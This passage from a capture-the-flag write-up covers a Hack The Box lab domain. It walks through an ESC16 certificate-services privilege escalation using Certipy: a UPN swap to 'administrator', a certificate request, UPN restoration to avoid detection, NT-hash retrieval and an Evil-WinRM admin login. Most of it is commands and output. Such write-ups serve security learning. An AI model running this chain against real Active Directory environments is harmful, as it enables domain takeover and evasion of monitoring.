*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> dir


    Directory: C:\Users\winrm_svc\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        5/26/2025   9:15 AM             34 user.txt


*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> type user.txt
a38741xxxxxxxxxxxxxxxxxxxxxxxxxx
```

&rarr; Login in as `winrm_svc` and get the `user.txt` flag.

Now, let's try to get the `root.txt` flag as we need to escalate from `winrm_svc` to `Administrator`.

Back to `certipy` to find the certificate vulnerable from `ca_svc`.
```bash
└─$ certipy find -u ca_svc -hashes <SNIP> -target fluffy.htb -text -stdout -vulnerable                 
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The resolution lifetime expired after 5.403 seconds: Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.
[!] Use -debug to print a stacktrace
[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[!] DNS resolution failed: The resolution lifetime expired after 5.404 seconds: Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.
[!] Use -debug to print a stacktrace
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates
```

Use there is a vulnerability in `ESC16` to exploit the certificate services.

Check out the `wiki` section and found this part [ESC16 - Security Extension is disabled on CA globally](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally).

*From this part: our attack flow is:* <br>
&rarr; `p.agila` → `ca_svc` (Shadow Credentials) → `administrator` (Certificate Attack)

Let's export kerberos ticket of `ca_svc` for authentication.
```bash
└─$ export KRB5CCNAME=ca_svc.ccache
```

```bash
└─$ certipy account -u 'ca_svc@fluffy.htb' -hashes ':<SNIP>' -dc-ip 10.129.xx.xx -user 'ca_svc' read
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'ca_svc':
    cn                                  : certificate authority service
    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
    name                                : certificate authority service
    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
    sAMAccountName                      : ca_svc
    servicePrincipalName                : ADCS/ca.fluffy.htb
    userPrincipalName                   : ca_svc@fluffy.htb
    userAccountControl                  : 66048
    whenCreated                         : 2025-04-17T16:07:50+00:00
    whenChanged                         : 2025-05-26T23:00:24+00:00
```

We read the certificate of `ca_svc` then we will modified `UPN` of `ca_svc` to `administrator`.
```bash
└─$ certipy account -u 'ca_svc@fluffy.htb' -hashes ':<SNIP>' -dc-ip 10.129.xx.xx -upn 'administrator' -user 'ca_svc' update
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'
```

Then request with template `User` because our `UPN` now is `administrator` so the certificate will issue to `administrator`.
```bash
└─$ certipy req -u 'ca_svc@fluffy.htb' -hashes ':<SNIP>' -target DC01.fluffy.htb -ca 'fluffy-DC01-CA' -template 'User'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The resolution lifetime expired after 5.404 seconds: Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.
[!] Use -debug to print a stacktrace
[!] DNS resolution failed: The resolution lifetime expired after 5.403 seconds: Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.
[!] Use -debug to print a stacktrace
[*] Requesting certificate via RPC
[*] Request ID is 16
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

After then restore `UPN` original value not to get detected.
```bash
└─$ certipy account -u 'ca_svc@fluffy.htb' -hashes ':<SNIP>' -dc-ip 10.129.xx.xx -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : ca_svc@fluffy.htb
[*] Successfully updated 'ca_svc'
```

Now we can use certificate after created to authenticate as `administrator`.
```bash
└─$ certipy auth -pfx administrator.pfx -username 'administrator' -domain 'fluffy.htb' -dc-ip 10.129.xx.xx
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:<SNIP>
```

Got the `NT hash` of `administrator` and also the kerberos ticket.

Able to login in as `administrator` and get the `root.txt` flag.
```text
└─$ evil-winrm -i 10.129.xx.xx -u 'administrator' -H '<SNIP>'                                 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        5/26/2025   9:15 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
7a71daxxxxxxxxxxxxxxxxxxxxxxxxxx
```

From this attack, we can see that: <br>
- `ESC16`: Security Extension is disabled → certificate attributes can be manipulated
- `UPN Confusion`: Change the UPN so that the certificate authority thinks it is issuing the cert to the `administrator`
- `Certificate Authority Trust`: The CA trusts the certificate request from the `ca_svc` account

This type of attack is really awesome, a combination of `Shadow Credentials` and `Certificate Services` vulnerabilities.

![result](/assets/img/fluffy-htb-season8/result.png)